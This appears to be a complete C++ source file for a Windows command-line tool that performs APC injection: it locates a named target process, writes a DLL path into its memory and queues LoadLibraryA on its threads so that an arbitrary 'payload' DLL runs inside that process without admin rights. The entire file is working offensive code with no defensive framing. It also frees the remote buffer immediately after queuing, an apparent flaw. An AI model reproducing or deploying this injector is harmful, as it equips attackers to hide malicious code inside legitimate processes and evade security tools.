//                APC Injection
/* Method of injecting payload using QueueUserAPC() function */
/* 
    Admin rights: Not required


 */

#include <windows.h>
#include <TlHelp32.h>
#include <vector>
#include <iostream>

using namespace std;

bool FindProcess(const char* exeName, DWORD& pid, vector<DWORD>& tids) {
    auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return false;
    pid = 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (::Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exeName) == 0) {
                pid = pe.th32ProcessID;
            	cout<<"[i] Found process ("<<exeName<<"), pid: "<<pid<<endl;
                THREADENTRY32 te = { sizeof(te) };
                cout<<"[i] Threads found to inject: ";
                if (::Thread32First(hSnapshot, &te)) {
                    do {
                        if (te.th32OwnerProcessID == pid) {
                        	cout<<te.th32ThreadID<<"  ";
                            tids.push_back(te.th32ThreadID);
                        }
                    } while (::Thread32Next(hSnapshot, &te));
                }
                cout<<endl;
                break;
            }
        } while (::Process32Next(hSnapshot, &pe));
    }
    ::CloseHandle(hSnapshot);
    return pid > 0 && !tids.empty();
}

void apcInjection(const char* buffer, const char* process)
{
	DWORD pid;
	vector<DWORD> tids;
	char lpdllpath[MAX_PATH];
	GetFullPathName(buffer, MAX_PATH, lpdllpath, nullptr);
	auto size = strlen(lpdllpath)*sizeof(TCHAR);
	cout<<"[i] full path: "<<lpdllpath<<endl;

	if (FindProcess(process, pid, tids)) {
		HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
		if(hProcess==NULL){
			cout<<"[!] failed to get handle for process: "<<pid<<endl;
			return;
		}
		auto p = ::VirtualAllocEx(hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if(p==NULL) {
			cout<<"[!] memory allocation failed!"<<endl;
			return ;
		}else{cout<<"[+] virtual mem allocation success"<<endl;}
		cout<<"[i] allocated memory address: "<<p<<endl;

		if(::WriteProcessMemory(hProcess, p, lpdllpath, size, nullptr)==0){
			DWORD err = GetLastError();
			cout<<"[!] write to victim process memory failed with error: "<<dec<<err<<endl;
			return ;
		}else{cout<<"[+] write to process success"<<endl;}

		for(vector<DWORD>::size_type i = 0; i != tids.size() && i<10; i++) {
			DWORD tid = tids[i];
			HANDLE hThread = ::OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
			cout<<endl;
			if (hThread!=NULL) {
				if(::QueueUserAPC(
					(PAPCFUNC)::GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA"),
					hThread, 
					(ULONG_PTR)p)==0){
					cout<<"[!] failed to queue user apc"<<endl;
				}
				else{
					cout<<"[+] user apc queued for thread (id: "<<tid<<")"<<endl;
				}
			}
			else{
				cout<<"[!] OpenThread failed to open thread (id: "<<tid<<")"<<endl;
				return;
			}
		}
		::VirtualFreeEx(hProcess, p, 0, MEM_RELEASE | MEM_DECOMMIT);
		cout<<"[+] VirtualFreeEx"<<endl;
	}
	else{
		cout<<"[!] specified process not found"<<endl;
	}
}


void main(int argc, char* argv[]){
    if(argc!=3){
        cout<<"Usage: apcInjection.exe payload process"<<endl;
        return;
    }
    apcInjection(argv[1], argv[2]);
    return;
}